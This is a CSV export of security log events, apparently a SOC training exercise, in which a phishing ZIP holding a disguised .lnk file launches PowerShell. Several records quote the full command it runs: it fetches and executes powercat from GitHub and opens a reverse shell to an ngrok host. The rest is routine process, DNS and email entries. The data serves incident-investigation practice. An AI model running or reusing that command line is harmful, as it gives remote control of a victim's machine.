"_id","_ignored","_index","_score",attachment,content,datasource,direction,"dns.answers.data","dns.question.name","dns.resolved_ip","event.action","event.code","file.path","host.name",message,"network.protocol","powershell.command.invocation_details.value","powershell.command.name","powershell.file.script_block_text","process.command_line","process.name","process.parent.name","process.parent.pid","process.pid","process.working_directory",recipient,"registry.key","registry.path","registry.value",sender,subject,timestamp,"winlog.process.pid"
"23V2ypsB8mE-0EyZE37f","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     $FuncVars[""Encoding""] = New-Object System.Text.AsciiEncoding. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=35	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    $FuncVars[""Encoding""] = New-Object System.Text.AsciiEncoding Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Text.AsciiEncoding""","-","""New-Object"", ""System.Text.AsciiEncoding""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"5HV2ypsB8mE-0EyZXn6m","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     $FuncVars[""Encoding""] = New-Object System.Text.AsciiEncoding. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=49	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    $FuncVars[""Encoding""] = New-Object System.Text.AsciiEncoding Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Text.AsciiEncoding""","-","""New-Object"", ""System.Text.AsciiEncoding""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"5XV2ypsB8mE-0EyZZX7p","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Temp\5\__PSScriptPolicyTest_hnpvwg1v.3mr.ps1","win-3450","-","-","-","-","-","-","powershell.exe","-","-",9060,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"7HV2ypsB8mE-0EyZiH72","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=15	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Net.WebClient""","-","""New-Object"", ""System.Net.WebClient""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:02.304","-"
"6HV2ypsB8mE-0EyZeX53","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Temp\5\__PSScriptPolicyTest_tuwnh53e.jfw.ps1","win-3450","-","-","-","-","-","-","powershell.exe","-","-",3880,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:01.304","-"
"03V1ypsB8mE-0EyZ3X43","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell""","powershell.exe","explorer.exe","3,180",3880,"C:\Windows\System32\WindowsPowerShell\v1.0\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:00.304","-"
"6nV2ypsB8mE-0EyZfX5H","-",logs,"-","-","-",sysmon,"-","-","-","-","File stream created (rule: FileCreateStreamHash)",15,"C:\Users\michael.ascot\AppData\Local\Temp\5\Temp1_ImportantInvoice-Febrary.zip\ImportantInvoice-Febrary\invioce.pdf.lnk","win-3450","-","-","-","-","-","-","Explorer.EXE","-","-",3180,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:59.304","-"
"5nV2ypsB8mE-0EyZaX6z","-",logs,"-","-","-",sysmon,"-","-","-","-","File stream created (rule: FileCreateStreamHash)",15,"C:\Users\michael.ascot\AppData\Local\Temp\5\Temp1_ImportantInvoice-Febrary.zip\ImportantInvoice-Febrary\invioce.pdf.lnk","win-3450","-","-","-","-","-","-","Explorer.EXE","-","-",3180,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:59.304","-"
"4nV2ypsB8mE-0EyZSn56","-",logs,"-",None," Forwarding this information to our design team for review and feedback",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","miguel.odonnell@tryhatme.com","-","-","-","jazmin@brimmedbeautiesco.com","FWD: Vendor Showcase: Latest Hat Materials and Designs","Jan 17, 2026 @ 02:37:55.304","-"
"0XV1ypsB8mE-0EyZun4N","-",logs,"-","-","-",sysmon,"-","3.22.53.161","2.tcp.ngrok.io","3.22.53.161","Dns query (rule: DnsQuery)",22,"-","win-3450","-",dns,"-","-","-","-","powershell.exe","-","-",3880,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:52.304","-"
"0nV1ypsB8mE-0EyZxX7K","-",logs,"-","-","-",sysmon,"-","185.199.111.133, 185.199.110.133, 185.199.109.133, 185.199.108.133","raw.githubusercontent.com","185.199.111.133, 185.199.110.133, 185.199.109.133, 185.199.108.133","Dns query (rule: DnsQuery)",22,"-","win-3450","-",dns,"-","-","-","-","powershell.exe","-","-",3880,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:51.304","-"
"3XV2ypsB8mE-0EyZG36a","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\ImportantInvoice-Febrary.zip","win-3450","-","-","-","-","-","-","OUTLOOK.EXE","-","-",8668,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:48.304","-"
"3nV2ypsB8mE-0EyZHH4m","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\ImportantInvoice-Febrary.zip","win-3450","-","-","-","-","-","-","OUTLOOK.EXE","-","-",8668,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:48.304","-"
"4XV2ypsB8mE-0EyZPn6-","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\ImportantInvoice-Febrary.zip:Zone.Identifier","win-3450","-","-","-","-","-","-","OUTLOOK.EXE","-","-",8668,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:48.304","-"
"ynV1ypsB8mE-0EyZMX5V","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3457","-","-","-","-","-","-","spoolsv.exe","-","-",3841,"-","-","SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Fax (redirected 5)\DsDriver\driverVersion","HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Fax (redirected 5)\DsDriver\driverVersion",driverVersion,"-","-","Jan 17, 2026 @ 02:37:16.304","-"
"0HV1ypsB8mE-0EyZrn4_","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3460","-","-","-","-","-","taskhostw.exe KEYROAMING","taskhostw.exe","svchost.exe",3540,3737,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:12.304","-"
"z3V1ypsB8mE-0EyZn35D","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3449","-","-","-","-","-","atbroker.exe","AtBroker.exe","winlogon.exe",3886,3943,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:04.304","-"
"znV1ypsB8mE-0EyZnn6m","-",logs,"-",None," Just confirming the meeting link and expected duration for the interview",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","tim@chicchapeauqueen.com","-","-","-","liam.espinoza@tryhatme.com","RE: RE: Job Interview Invitation: Exciting Career Opportunity","Jan 17, 2026 @ 02:37:00.304","-"
"zXV1ypsB8mE-0EyZmn7P","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3458","-","-","-","-","-","-","spoolsv.exe","-","-",3638,"-","-","System\CurrentControlSet\Enum\SWD\PRINTENUM\{2D00BA8B-3E7F-4C85-88E7-D1E9D13350F0}\FriendlyName","HKLM\System\CurrentControlSet\Enum\SWD\PRINTENUM\{2D00BA8B-3E7F-4C85-88E7-D1E9D13350F0}\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:37:00.304","-"
"y3V1ypsB8mE-0EyZPX4X","-",logs,"-",None," The happiest hat place on Earth is waiting for you Win an all expenses paid trip just click below and hope for the best",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","liam.espinoza@tryhatme.com","-","-","-","combs@hatventuresworldwide.online","Win a Trip to Hat Disneyland Magical Memories Await","Jan 17, 2026 @ 02:36:51.304","-"
"xXV0ypsB8mE-0EyZrH5s","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3461","-","-","-","-","-","""LogonUI.exe"" /flags:0x0 /state0:0xb572b855 /state1:0x41c64e6d","LogonUI.exe","winlogon.exe",3604,3822,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:36:40.304","-"
"x3V0ypsB8mE-0EyZvH4u","-",logs,"-",None," The upcoming seminar will cover the latest innovations in hat manufacturing and design Secure your spot today",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","skinner@fashionhatchronicle.com","-","-","-","contact@tryhatme.com","Seminar Registration: Hat Industry Innovation Trends","Jan 17, 2026 @ 02:36:40.304","-"
"zHV1ypsB8mE-0EyZUX4G","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3454","-","-","-","-","-","C:\Windows\system32\rundll32.exe C:\Windows\system32\inetcpl.cpl,ClearMyTracksByProcess Flags:276824072 WinX:0 WinY:0 IEFrame:0000000000000000","rundll32.exe","iexplore.exe",3861,3824,"C:\Users\liam.espinoza\Desktop\","-","-","-","-","-","-","Jan 17, 2026 @ 02:36:37.304","-"
"yHV0ypsB8mE-0EyZ037M","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3458","-","-","-","-","-","atbroker.exe","AtBroker.exe","winlogon.exe",3557,3548,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:36:28.304","-"
"yXV1ypsB8mE-0EyZEX75","-",logs,"-",None," Do you have estimated costs for different material options and production timelines",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","shah@trendyheadwearblog.com","-","-","-","ceo@tryhatme.com","RE: RE: Exploring Partnership Potential: Custom Hat Design Proposal","Jan 17, 2026 @ 02:36:23.304","-"
"w3V0ypsB8mE-0EyZgX6Y","-",logs,"-",None," Travel through time and experience the evolution of hats from ancient Egypt to futuristic Mars Only 500 per ticket",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","armaan.terry@tryhatme.com","-","-","-","stone@fashionindustrytrends.xyz","Time Traveling Hat Adventure Explore Ancient Lands for Cheap","Jan 17, 2026 @ 02:36:19.304","-"
"wnV0ypsB8mE-0EyZdX7S","-",logs,"-",None," Quit your job today and make 10000 per day from home All you need is an internet connection and zero critical thinking skills",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","gerard@headtoppersinc.xyz","-","-","-","contact@tryhatme.com","Work from Home and Make 10000 a Day Scam Alert","Jan 17, 2026 @ 02:36:16.304","-"
"wHV0ypsB8mE-0EyZP34a","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3449","-","-","-","-","-","C:\Windows\servicing\TrustedInstaller.exe","TrustedInstaller.exe","services.exe",3965,3535,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:36:10.304","-"
"v3V0ypsB8mE-0EyZO34p","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3456","-","-","-","-","-","taskhostw.exe NGCKeyPregen","taskhostw.exe","svchost.exe",3601,3756,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:36:10.304","-"
"xHV0ypsB8mE-0EyZoH7n","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3453","-","-","-","-","-","""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"" ","OUTLOOK.EXE","explorer.exe",3722,3903,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:36:07.304","-"
"xnV0ypsB8mE-0EyZtH41","-",logs,"-",None," Thank you for the opportunity I confirm my availability and look forward to speaking with your team",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","invoice@tryhatme.com","-","-","-","levine@trendytopperssummit.com","RE: Job Interview Invitation: Exciting Career Opportunity","Jan 17, 2026 @ 02:36:04.304","-"
"vXV0ypsB8mE-0EyZCH5f","-",logs,"-",None," Do you have a booth number or schedule for presentations I would like to plan accordingly",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","armaan.terry@tryhatme.com","-","-","-","effie@hatcouturecompany.net","RE: RE: Upcoming Trade Show Attendance: Meet our Hat Experts","Jan 17, 2026 @ 02:35:47.304","-"
"wXV0ypsB8mE-0EyZZn47","-",logs,"-",None," Stock up now with this once in a lifetime deal Buy 100 hats and get 99 more free because we definitely did the math right",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","liam.espinoza@tryhatme.com","-","-","-","odom@gmail.com","Exclusive Offer: Buy 100 Hats Get 99 Free Limited Time Only","Jan 17, 2026 @ 02:35:36.304","-"
"vnV0ypsB8mE-0EyZI37T","-",logs,"-","-","-",sysmon,"-","172.16.1.15","mailsrv-01.tryhatme.com","172.16.1.15","Dns query (rule: DnsQuery)",22,"-","win-3456","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3978,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:35:35.304","-"
"u3VzypsB8mE-0EyZzX7L","-",logs,"-",None," Looking forward to hearing the updates.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","miguel.odonnell@tryhatme.com","-","-","-","miguel.odonnell@tryhatme.com","RE: CEO Address - Company Vision and Goals","Jan 17, 2026 @ 02:35:33.304","-"
"vHVzypsB8mE-0EyZ2X6d","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michelle.smith\Downloads\forceupdate.ps1","win-3459","-","-","-","-","-","-","IEXPLORE.EXE","-","-",8013,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:35:06.304","-"
"unVzypsB8mE-0EyZnn7p","-",logs,"-",None," Take a look at this and send me your inputs.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","invoice@tryhatme.com","-","-","-","invoice@tryhatme.com","FWD: Marketing Campaign Strategy - Feedback Needed","Jan 17, 2026 @ 02:34:45.304","-"
"uXVzypsB8mE-0EyZj35v","-",logs,"-","-","-",sysmon,"-","172.16.1.15","mailsrv-01.tryhatme.com","172.16.1.15","Dns query (rule: DnsQuery)",22,"-","win-3460","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3979,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:34:42.304","-"
"uHVzypsB8mE-0EyZCn5w","-",logs,"-","-","-",sysmon,"-","172.16.1.15","mailsrv-01.tryhatme.com","172.16.1.15","Dns query (rule: DnsQuery)",22,"-","win-3455","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3946,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:34:41.304","-"
"t3VyypsB8mE-0EyZ9n7l","-",logs,"-",None," Thank you for the opportunity I confirm my availability and look forward to speaking with your team",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","michelle.smith@tryhatme.com","-","-","-","rosario@chicchapeauconclave.com","RE: Job Interview Invitation: Exciting Career Opportunity","Jan 17, 2026 @ 02:34:19.304","-"
"tnVyypsB8mE-0EyZ037w","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3457","-","-","-","-","-","C:\Windows\system32\rundll32.exe C:\Windows\system32\inetcpl.cpl,ClearMyTracksByProcess Flags:8388616 WinX:0 WinY:0 IEFrame:0000000000000000","rundll32.exe","iexplore.exe",3732,3702,"C:\Users\diego.summers\Desktop\","-","-","-","-","-","-","Jan 17, 2026 @ 02:34:15.304","-"
"tXVyypsB8mE-0EyZcn4Z","-",logs,"-",None," Any updates on the marketing side?",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","ashwin.johnston@tryhatme.com","-","-","-","ashwin.johnston@tryhatme.com","RE: RE: New Product Launch - All Hands on Deck","Jan 17, 2026 @ 02:34:15.304","-"
"tHVyypsB8mE-0EyZZn6n","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3457","-","-","-","-","-","""C:\Windows\System32\Sethc.exe"" /AccessibilitySoundAgent","sethc.exe","AtBroker.exe",3736,3745,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:34:09.304","-"
